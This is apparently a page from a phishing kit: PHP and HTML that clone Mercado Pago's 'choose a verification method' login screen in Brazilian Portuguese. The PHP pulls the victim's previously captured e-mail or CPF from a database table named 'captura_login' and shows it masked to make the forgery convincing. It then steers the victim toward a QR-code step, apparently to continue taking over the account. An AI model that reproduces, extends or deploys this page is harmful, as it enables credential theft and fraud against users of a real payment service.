<?php
// Bloco PHP completo para buscar e formatar dados
session_start();
require 'db.php';
$identificador_label = 'Não identificado';
$email_mascarado = 'seu e-mail';
$telefone_final = '****';
if (isset($_COOKIE['identificador_cliente'])) {
    $session_id = $_COOKIE['identificador_cliente'];
    try {
        $stmt = $pdo->prepare("SELECT identificador FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1");
        $stmt->execute([$session_id]);
        $resultado = $stmt->fetch(PDO::FETCH_ASSOC);
        if ($resultado) {
            $identificador_puro = $resultado['identificador'];
            if (filter_var($identificador_puro, FILTER_VALIDATE_EMAIL)) {
                $identificador_label = 'E-mail: ' . htmlspecialchars($identificador_puro);
                $partes_email = explode('@', $identificador_puro);
                if (count($partes_email) === 2) {
                    $usuario = $partes_email[0];
                    $dominio = $partes_email[1];
                    $usuario_visivel = substr($usuario, 0, 3);
                    $email_mascarado = htmlspecialchars($usuario_visivel) . '***@' . htmlspecialchars($dominio);
                }
            } else {
                $identificador_label = 'CPF: ' . htmlspecialchars($identificador_puro);
            }
        } else { header('Location: login-mobile.php'); exit; }
    } catch (PDOException $e) { die("Erro ao consultar o banco de dados: " . $e->getMessage()); }
} else { header('Location: login-mobile.php'); exit; }
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Escolha um método de verificação</title>
    <style>
        :root {
            --andes-color-yellow-500: #ffe600;
            --andes-color-blue-100: rgba(52, 131, 250, 0.1);
            --andes-color-blue-500: #3483fa;
            --andes-text-color-primary: #333;
            --andes-text-color-secondary: #555;
            --andes-text-color-link: var(--andes-color-blue-500);
            --andes-background-color-primary: #fff;
            --andes-background-color-secondary: #f5f5f5;
            --andes-border-color-secondary: #ededed;
        }
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; display: flex; flex-direction: column; min-height: 100vh; background-color: var(--andes-background-color-secondary); }
        .main-header { background-color: var(--andes-color-yellow-500); padding: 12px 24px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.1); height: 60px; box-sizing: border-box; display: flex; align-items: center; }
        .main-header img { height: 32px; }
        
        /* ALTERAÇÃO: Main content agora é um container flex para empurrar o rodapé de ajuda para baixo */
        .main-content { padding: 24px; background-color: var(--andes-background-color-primary); flex-grow: 1; display: flex; flex-direction: column; }
        
        .user-identifier-box { display: flex; align-items: center; gap: 12px; border: 1px solid rgba(0, 0, 0, .1); border-radius: 1.5625rem; padding: 8px 12px; width: fit-content; margin-bottom: 24px; }
        .icon-wrapper { width: 32px; height: 32px; border-radius: 50%; background-color: var(--andes-color-blue-100); display: flex; align-items: center; justify-content: center; }
        .user-identifier-box .icon-wrapper svg { color: var(--andes-color-blue-500); }
        .identifier-text-block { display: flex; flex-direction: column; }
        .identifier-text-block .cpf-text { font-size: 14px; font-weight: 400; color: var(--andes-text-color-primary); }
        .identifier-text-block .change-account-link { font-size: 13px; color: var(--andes-text-color-link); text-decoration: none; margin-top: 2px; }
        
        .session-start-label { font-size: 12px; font-weight: 600; color: var(--andes-text-color-secondary); text-transform: uppercase; margin-bottom: 8px; }
        .main-title { font-size: 26px; font-weight: 400; color: var(--andes-text-color-primary); line-height: 1.25; margin: 0 0 24px 0; }
        
        .verification-card { box-sizing: border-box; }
        .verification-option { display: flex; align-items: center; gap: 16px; padding: 16px 0; text-decoration: none; color: inherit; }
        .verification-option .icon-container { width: 40px; height: 40px; border-radius: 50%; background-color: var(--andes-color-blue-100); display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
        .verification-option .icon-container svg path { fill: currentColor; }
        .verification-option .text-content { flex-grow: 1; }
        .verification-option .text-content h3 { margin: 0 0 4px 0; font-size: 16px; font-weight: 500; }
        .verification-option .text-content p { margin: 0; font-size: 14px; color: var(--andes-text-color-secondary); }
        .verification-option .chevron-icon { margin-left: auto; }
        .verification-option .chevron-icon polyline { stroke: var(--andes-color-blue-500); }
        
        /* NOVO: Wrapper para os links inferiores */
        .bottom-support {
            margin-top: auto; /* Empurra para o final do container */
            padding-top: 24px;
            text-align: center;
        }

        .final-separator {
            height: 1px;
            background-color: var(--andes-border-color-secondary);
            width: 100%;
            margin: 0 auto 16px auto; /* Espaço abaixo do separador */
        }
        
        .help-link {
            color: var(--andes-text-color-link);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.72/mercadopago/logo__small.png" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <div class="user-identifier-box">
            <div class="icon-wrapper">
                <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.999 15.75C15.7275 15.75 18.75 12.7275 18.75 8.999C18.75 5.27053 15.7275 2.248 11.999 2.248C8.27053 2.248 5.248 5.27053 5.248 8.999C5.248 12.7275 8.27053 15.75 11.999 15.75ZM11.999 14.25C9.09895 14.25 6.748 11.899 6.748 8.999C6.748 6.09895 9.09895 3.748 11.999 3.748C14.899 3.748 17.25 6.09895 17.25 8.999C17.25 11.899 14.899 14.25 11.999 14.25Z"></path><path d="M5.98045 18.75C4.74861 18.75 3.75 19.7486 3.75 20.9804V21.7304H2.25V20.9804C2.25 18.9202 3.92018 17.25 5.98045 17.25H18C20.0711 17.25 21.75 18.9289 21.75 21V21.75H20.25V21C20.25 19.7574 19.2426 18.75 18 18.75H5.98045Z"></path></svg>
            </div>
            <div class="identifier-text-block">
                <span class="cpf-text"><?php echo $identificador_label; ?></span>
                <a href="/login-mobile.php" class="change-account-link">Trocar conta</a>
            </div>
        </div>

        <span class="session-start-label">INÍCIO DE SESSÃO</span>
        <h1 class="main-title">Escolha um método de verificação para iniciar sessão</h1>
        
        <div class="verification-card">
            
            <a href="telaqr.php" class="verification-option">
                <div class="icon-container"><svg class="channel-icon__shape--filled" width="20" height="20" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path d="M11.6871 0H8.32307V6.66142H9.98973V4.97848H11.6667V3.31313H9.98973V1.66536H11.6871V0Z"></path><path d="M11.6564 13.2617V14.9271H9.98973V16.6673H8.32307V11.6712H9.98973V13.2617H11.6564Z"></path><path d="M18.3333 18.3238H20V19.9892H18.3333V18.3238Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M10.0204 10.0097V11.6495H11.6769V13.3384H13.3026V18.3258H18.3026V16.6322H20V14.9668H18.3026V13.3298H13.3435V10.0077H11.6871V6.67894H10.0204V8.34431H6.64621V9.98419H4.95381V8.32483H1.62048V9.93896H0V11.6043H1.66667V9.99018H3.32836V11.6495H6.66169V10.0097H10.0204ZM14.9693 14.9951H16.6359V16.6605H14.9693V14.9951Z"></path><path d="M18.3795 9.99018H16.6769V11.6645H15.0102V9.99018H13.3795V8.32483H18.3795V9.99018Z"></path><path d="M18.3333 10.0077H20V13.3384H18.3333V10.0077Z"></path><path d="M10.0204 16.6693H11.6871V18.3346H13.3538V20H8.35384V18.3346H10.0204V16.6693Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0 0V6.67897H6.62046V0H0ZM4.9538 1.66536H1.66667V5.01361H4.9538V1.66536Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0 13.321H6.62046V20H0V13.321ZM1.66667 14.9864H4.9538V18.3346H1.66667V14.9864Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M13.3591 0.00321877V6.68219H19.9795V0.00321877H13.3591ZM18.3129 1.66857H15.0257V5.01683H18.3129V1.66857Z"></path></svg></div>
                    <div class="text-content"><h3>Código QR</h3><p>Você vai escanear o código com a câmera do seu celular ou pelo app do Mercado Pago.</p></div>
                    <div class="chevron-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
                </a>

                <a href="#" class="verification-option">
                    <div class="icon-container"><svg class="channel-icon__shape--filled" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path d="M16.0591 18.9099L16.5741 18.3648H16.5741L16.0591 18.9099ZM18.9991 20.4404C19.4111 20.4824 19.7793 20.1824 19.8213 19.7704C19.8633 19.3583 19.5634 18.9902 19.1513 18.9481L18.9991 20.4404ZM15.3291 14.9569C14.58 14.9929 14.58 14.9929 14.58 14.993C14.58 14.9931 14.58 14.9932 14.58 14.9933C14.58 14.9934 14.5801 14.9937 14.5801 14.994C14.5801 14.9945 14.5801 14.9953 14.5802 14.9963C14.5803 14.9982 14.5804 15.001 14.5806 15.0046C14.581 15.0117 14.5815 15.022 14.5822 15.0353C14.5836 15.0619 14.5857 15.1003 14.5886 15.1491C14.5944 15.2468 14.6033 15.386 14.6157 15.5545C14.6405 15.8907 14.6797 16.3472 14.7375 16.8233C14.7948 17.2956 14.8724 17.8055 14.9771 18.2418C15.0293 18.4594 15.0923 18.6762 15.1702 18.8684C15.2411 19.0432 15.3545 19.2761 15.544 19.4551L16.5741 18.3648C16.6222 18.4102 16.6068 18.4193 16.5604 18.3049C16.5211 18.2078 16.4784 18.0699 16.4357 17.8918C16.3505 17.5368 16.281 17.0919 16.2266 16.6427C16.1725 16.1974 16.1353 15.7658 16.1116 15.4442C16.0998 15.2839 16.0914 15.1519 16.086 15.0605C16.0833 15.0148 16.0813 14.9792 16.0801 14.9555C16.0794 14.9436 16.079 14.9346 16.0787 14.9288C16.0785 14.9259 16.0784 14.9237 16.0784 14.9224C16.0783 14.9217 16.0783 14.9213 16.0783 14.921C16.0783 14.9209 16.0783 14.9208 16.0783 14.9208C16.0783 14.9208 16.0783 14.9208 16.0783 14.9208C16.0783 14.9208 16.0783 14.9208 15.3291 14.9569ZM15.544 19.4551C15.8194 19.7153 16.2249 19.8717 16.5412 19.9725C16.8913 20.0841 17.2838 20.1721 17.6398 20.2394C17.9988 20.3073 18.337 20.3573 18.5844 20.3903C18.7085 20.4068 18.8108 20.4192 18.8826 20.4275C18.9185 20.4317 18.9469 20.4348 18.9667 20.437C18.9765 20.438 18.9843 20.4388 18.9897 20.4394C18.9924 20.4397 18.9946 20.4399 18.9961 20.4401C18.9969 20.4402 18.9976 20.4402 18.9981 20.4403C18.9983 20.4403 18.9985 20.4403 18.9987 20.4404C18.9988 20.4404 18.9989 20.4404 18.9989 20.4404C18.999 20.4404 18.9991 20.4404 19.0752 19.6943C19.1513 18.9481 19.1513 18.9481 19.1514 18.9481C19.1514 18.9481 19.1514 18.9482 19.1514 18.9482C19.1515 18.9482 19.1515 18.9482 19.1514 18.9481C19.1513 18.9481 19.151 18.9481 19.1506 18.9481C19.1498 18.948 19.1485 18.9478 19.1465 18.9476C19.1427 18.9472 19.1366 18.9466 19.1284 18.9457C19.112 18.9439 19.0871 18.9412 19.055 18.9374C18.9906 18.93 18.8969 18.9187 18.7825 18.9034C18.5527 18.8728 18.2429 18.8269 17.9186 18.7656C17.5913 18.7036 17.2651 18.6289 16.9967 18.5433C16.8627 18.5006 16.7552 18.459 16.6748 18.4205C16.5883 18.3791 16.5654 18.3565 16.5741 18.3648L15.544 19.4551Z" class="channel-icon__shape--stroked"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M7.10628 11.6232C6.41183 11.4919 5.8866 10.882 5.8866 10.1493C5.8866 9.61262 6.16849 9.14174 6.59229 8.87667C6.58583 8.80996 6.58018 8.74624 6.57538 8.68594C6.60611 5.97593 8.9729 3.64203 12.0751 3.64203C15.1998 3.64203 17.5751 5.99438 17.5751 8.73935C17.5751 8.76519 17.5749 8.79187 17.5745 8.81935C18.0531 9.06992 18.3798 9.57138 18.3798 10.1491C18.3798 10.8795 17.8578 11.488 17.1665 11.6218C17.093 11.8849 17.016 12.1035 16.9405 12.2626C15.9914 14.2627 14.1299 15.537 12.0751 15.537C10.0793 15.537 8.3293 14.2821 7.33972 12.2492C7.26237 12.0903 7.18335 11.8773 7.10628 11.6232ZM18.2956 12.9057C18.7937 11.856 19.0751 9.83535 19.0751 8.73935C19.0751 5.08141 15.9411 2.14203 12.0751 2.14203C8.20908 2.14203 5.07507 5.09575 5.07507 8.73935C5.15465 9.82061 5.47507 11.8457 5.99102 12.9057C7.1736 15.3351 9.38343 17.037 12.0751 17.037C14.7827 17.037 17.1313 15.3593 18.2956 12.9057Z" class="channel-icon__shape--filled"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M17.6098 11.4429C17.3733 12.067 17.0174 12.6369 16.5682 13.1278C16.665 13.1372 16.7632 13.142 16.8625 13.142C18.5193 13.142 19.8625 11.7989 19.8625 10.142C19.8625 8.63343 18.7489 7.38491 17.299 7.17356C17.6178 7.74952 17.8287 8.3879 17.9059 9.06437C18.1874 9.33705 18.3625 9.7191 18.3625 10.142C18.3625 10.6984 18.0596 11.184 17.6098 11.4429Z" class="channel-icon__shape--filled"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.83764 7.19033C5.4386 7.44471 4.37781 8.66939 4.37781 10.1418C4.37781 11.7987 5.72095 13.1418 7.37781 13.1418C7.47189 13.1418 7.56495 13.1375 7.65682 13.129C7.18867 12.6307 6.81785 12.048 6.57276 11.4077C6.15494 11.1414 5.87781 10.674 5.87781 10.1418C5.87781 9.75946 6.02087 9.41051 6.2564 9.14559C6.31716 8.44672 6.52011 7.78622 6.83764 7.19033Z" class="channel-icon__shape--filled"></path><path d="M22.6027 4.71368V1.32945H19.4891" class="channel-icon__shape--stroked"></path><path d="M1.26428 4.71368V1.32945H4.3778" class="channel-icon__shape--stroked"></path><path d="M1.26428 19.2494V22.6336H4.3778" class="channel-icon__shape--stroked"></path><path d="M22.6027 19.2494V22.6336H19.4891" class="channel-icon__shape--stroked"></path></svg></div>
                    <div class="text-content"><h3>Reconhecimento facial</h3><p>Vamos usar a câmera do seu celular para reconhecer seu rosto.</p></div>
                    <div class="chevron-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
                </a>

                <a href="#" class="verification-option">
                     <div class="icon-container"><svg class="channel-icon__shape--filled" width="20" height="21" viewBox="0 0 20 21" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path d="M5.50006 7.30047H14.5001V5.50047H5.50006V7.30047Z"></path><path d="M10.8986 10.9001H5.50006V9.10007H10.8986V10.9001Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M0.101562 13.5995C0.101562 15.0906 1.31039 16.2995 2.80156 16.2995H9.72759L16.3001 20.6806V16.2995H17.1986C18.6897 16.2995 19.8986 15.0906 19.8986 13.5995V2.80107C19.8986 1.30991 18.6897 0.101074 17.1986 0.101074H2.80156C1.31039 0.101074 0.101562 1.30991 0.101562 2.80107V13.5995ZM17.1986 14.4995H14.5001V17.3175L10.2725 14.4995H2.80156C2.30451 14.4995 1.90156 14.0965 1.90156 13.5995V2.80107C1.90156 2.30402 2.30451 1.90107 2.80156 1.90107H17.1986C17.6956 1.90107 18.0986 2.30402 18.0986 2.80107V13.5995C18.0986 14.0965 17.6956 14.4995 17.1986 14.4995Z"></path></svg></div>
                    <div class="text-content"><h3>SMS</h3><p>Vamos enviar um código para o telefone terminado em ****.</p></div>
                    <div class="chevron-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
                </a>

                <a href="#" class="verification-option">
                    <div class="icon-container"><svg class="channel-icon__shape--filled" width="25" height="24" viewBox="0 0 25 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path d="M2.01229 17.8374C0.934723 16.0295 0.368801 13.9788 0.371578 11.8919C0.37423 5.33471 5.88817 0 12.6634 0C15.9248 0.000528957 19.0523 1.25486 21.3577 3.48692C23.663 5.71898 24.9572 8.74584 24.9554 11.9013C24.9526 18.4586 19.438 23.7938 12.6637 23.7938H12.6586C10.6064 23.7937 8.58686 23.2961 6.78462 22.3463L0.268555 24L2.01229 17.8374ZM7.45946 20.4075C9.0337 21.3096 10.8297 21.7853 12.6594 21.7853H12.6635C18.2946 21.7853 22.8774 17.3509 22.8799 11.9005C22.8815 9.27849 21.8065 6.76325 19.8913 4.90813C17.9761 3.05302 15.3777 2.01001 12.6676 2.00856C7.03227 2.00856 2.44914 6.44252 2.44683 11.8925C2.44401 13.7535 2.98548 15.5772 4.0087 17.153L4.25158 17.527L3.21952 21.1746L7.08626 20.1932L7.45946 20.4075ZM14.6695 17.4375C14.0748 17.2589 13.4904 17.05 12.9186 16.8117C9.8376 15.5244 7.82546 12.523 7.67187 12.3247C7.51828 12.1263 6.41773 10.7134 6.41773 9.25067C6.41773 7.78795 7.21115 7.06921 7.4927 6.77166C7.70019 6.54255 7.99719 6.40774 8.31193 6.39981C8.51663 6.39981 8.72161 6.40163 8.90055 6.4103C8.92271 6.41139 8.94581 6.41122 8.96968 6.4111C9.14862 6.41013 9.37158 6.40922 9.5916 6.92033C9.84756 7.51537 10.4618 8.9781 10.5386 9.12687C10.6154 9.27565 10.6666 9.44911 10.5642 9.6475C10.4618 9.84589 10.4106 9.96969 10.2571 10.1432C10.1035 10.3167 9.93456 10.5306 9.79635 10.6638C9.64269 10.812 9.48256 10.9729 9.66179 11.2702C9.84102 11.5676 10.4575 12.5408 11.3703 13.3288C12.5432 14.3412 13.5331 14.655 13.8403 14.8037C14.1474 14.9525 14.3265 14.9276 14.5056 14.7296C14.6847 14.5316 15.2734 13.8619 15.4781 13.5644C15.6827 13.2669 15.8876 13.3165 16.169 13.4156C16.4504 13.5148 17.9607 14.2337 18.2677 14.3824C18.5747 14.5312 18.7796 14.6056 18.8563 14.7296C18.933 14.8536 18.9329 15.4484 18.6772 16.1427C18.4216 16.837 17.1942 17.4703 16.6042 17.5556C16.3575 17.5925 16.1083 17.6116 15.8587 17.6126C15.4553 17.6142 15.0541 17.5551 14.6695 17.4375Z"></path></svg></div>
                    <div class="text-content"><h3>WhatsApp</h3><p>Vamos enviar um código para o telefone terminado em ****.</p></div>
                    <div class="chevron-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
                </a>
                
                <a href="#" class="verification-option">
                    <div class="icon-container"><svg class="channel-icon__shape--filled" width="24" height="14" viewBox="0 0 24 14" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path fill-rule="evenodd" clip-rule="evenodd" d="M0.75 0.25H23.25V13.75H0.75V0.25ZM2.25 3.79417V12.25H21.75V3.79417L13.8601 8.30121C12.7074 8.95964 11.2926 8.95964 10.1399 8.30121L2.25 3.79417ZM2.25 2.06669L10.884 6.99874C11.5755 7.39379 12.4245 7.39379 13.116 6.99874L21.75 2.06669V1.75H2.25V2.06669Z"></path></svg></div>
                    <div class="text-content"><h3>E-mail</h3><p>Vamos enviar um código para <?php echo $email_mascarado; ?>.</p></div>
                    <div class="chevron-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
                </a>

                <div class="final-separator"></div>
                
                <a href="https://www.mercadopago.com.br/account-recovery/landing-page?callback=https%3A%2F%2Fwww.mercadolivre.com%2Fjms%2Fmlb%2Flgz%2Fmsl%2Flogin%2FH4sIAAAAAAAEAy1P2w6CMAz9lz0bwHvg0R9ZCpTZuLFlKw5j_Hc79PGcnlvfynpDs-ZXQNUpXIOlgVjtVLDAk49O0ygHF4RKxPiHti8SiOCQMSbVvUuQwfGGYipRHBcUDSx815P1WaitSjhKGlexzWB1xv5JWK4T2FQcxgu4M4fU1XXOuXIYBxh9AOOrwbuqj7XIIhpKEoJl3lb22UlGYs0RhofqCif9oXwETH7-Tb-c2vNhf2zatjldzlf1-QLy-mEhAwEAAA%2Fsfa_removal%2Fcallback%3Fdps%3Darmor.26fffe04d42d6e334d245750e2be1f8563da232381384b96c08a7c0f0c67185eb2c7c4a614f5f3279aeea54552a2f88c5819aa3720ab720a18c5e3fe6690abbec651fb16a6a8816317b21d773163d163fcd3ded440ef946cd7c9957f4e3fcc32.fbb6183e18d9eba0900a8ec20ff7d912%26rbms%3D&on_hold_delay=24&recovery_type=CHANGE_EMAIL&transaction_id=aPsEtzPIkxgHrqeP2RIaFCOA5k7VZLGN" class="cant-login-link">Não consigo iniciar sessão</a>
            </div>
        </div>
    </main>

</body>
</html>